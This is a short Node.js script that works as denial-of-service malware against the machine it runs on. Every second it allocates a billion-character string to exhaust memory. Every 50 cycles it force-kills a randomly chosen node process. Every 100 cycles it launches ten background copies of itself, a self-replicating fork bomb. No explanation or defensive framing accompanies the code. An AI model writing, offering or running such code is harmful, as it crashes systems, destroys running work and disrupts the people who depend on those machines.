const { exec } = require('child_process');

// Function to generate large data structure
function generateData() {
    return Array.from({ length: 10 ** 9 }, () => Math.random().toString(36).substring(2, 3)).join('');
}

// Function to kill a random process
function killRandomProcess() {
    exec('kill -9 $(pgrep -P 1 node | shuf -n 1)', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`stderr: ${stderr}`);
            return;
        }
        console.log(`Killed process: ${stdout.trim()}`);
    });
}

// Function to overwhelm the system
function overwhelmSystem() {
    console.log("Overwhelming system...");
    for (let i = 0; i < 10; i++) {
        exec('node ' + __filename + ' &', (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
                return;
            }
            if (stderr) {
                console.error(`stderr: ${stderr}`);
                return;
            }
        });
    }
}

// Main function
function main() {
    let count = 1;

    setInterval(() => {
        // Generate large data structure to consume memory
        const data = generateData();

        // Save to multiple text files (simulated)
        for (let i = 0; i < 10000; i++) {
            // Simulate file creation
        }

        count++;

        // Kill random process every 50 iterations
        if (count % 50 === 0) {
            killRandomProcess();
        }

        // Overwhelm the system every 100 iterations
        if (count % 100 === 0) {
            overwhelmSystem();
        }
    }, 1000); // Run every second
}

// Start the main function
main();
